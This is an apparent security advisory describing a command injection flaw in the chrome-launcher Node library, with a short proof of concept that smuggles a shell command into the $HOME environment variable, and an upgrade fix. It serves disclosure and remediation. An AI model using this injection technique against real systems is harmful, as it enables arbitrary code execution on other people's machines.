vulnerabilities.description:
## Overview
[chrome-launcher](https://github.com/GoogleChrome/chrome-launcher) is a library to launch Google Chrome with ease from node.

Affected versions of this package are vulnerable to Command Injection. By controlling the `$HOME` environment variable in Linux operating systems, an attacker can execute arbitrary code.

## PoC:
```
var malicious_code = '& touch malicious_file &';
process.env.HOME += "/" + malicious_code;
var Root = require("chrome-launcher");
Root.launch();
```
## Remediation
Upgrade `chrome-launcher` to version 0.13.2 or higher.

